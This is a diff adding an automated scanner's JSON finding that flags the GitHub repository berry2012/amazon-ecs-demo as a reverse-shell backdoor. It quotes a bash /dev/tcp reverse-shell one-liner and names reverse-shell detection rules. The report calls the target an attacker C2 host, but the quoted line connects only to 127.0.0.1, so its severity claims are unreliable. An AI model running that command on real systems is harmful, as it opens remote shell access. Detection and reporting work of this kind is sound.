@@ -1,0 +1,66 @@
+{
+  "finding": {
+    "key": "repository:berry2012/amazon-ecs-demo",
+    "kind": "repository",
+    "family": "",
+    "id": "berry2012/amazon-ecs-demo",
+    "url": "https://github.com/berry2012/amazon-ecs-demo",
+    "registry": "github",
+    "owner": "berry2012",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 11,
+    "detection_method": "ioc_search",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "reverse_shell/bash-i-socket; reverse_shell/dev-tcp-redirect",
+    "evidence_locations": "demo.sh:117",
+    "c2_hosts": "",
+    "iocs": "demo.sh",
+    "matched_signatures": "xmr.metal3d.org",
+    "reasons": "Code references OSM IOC(s) ['xmr.metal3d.org'] in ['demo.sh'] | Tier-2 confirmed (bash score 10)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T213825Z",
+    "last_seen": "hunt-20260910T213825Z",
+    "evidence_file": "repositories/berry2012_amazon-ecs-demo.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "demo.sh",
+      "line": 117,
+      "category": "reverse_shell",
+      "rule": "bash-i-socket",
+      "snippet": "bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'"
+    },
+    {
+      "file": "demo.sh",
+      "line": 117,
+      "category": "reverse_shell",
+      "rule": "dev-tcp-redirect",
+      "snippet": "bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'"
+    }
+  ],
+  "commit_sha": "ce0d8211a025276d1c4d21ed861fa6482fd3a642",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/berry2012/amazon-ecs-demo",
+    "version_info": "all",
+    "threat_description": "Reverse shell backdoor. Payload in demo.sh.\nOutbound: C2. It opens a remote shell to an attacker host (demo.sh:117).\nFound by GitHub code search for a confirmed malware signature: xmr.metal3d.org.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: demo.sh\n- Outbound: C2. It opens a remote shell to an attacker host (demo.sh:117).\n- demo.sh:117: interactive bash bound to a network socket (reverse shell)\n- demo.sh:117: shell redirected over /dev/tcp to a remote host",
+    "publisher": "berry2012",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/berry2012/amazon-ecs-demo/blob/ce0d8211a025276d1c4d21ed861fa6482fd3a642/demo.sh#L117",
+    "verified_iocs": "demo.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T21:38:25Z",
+    "last_seen": "2026-09-10T21:38:25Z"
+  }
+}
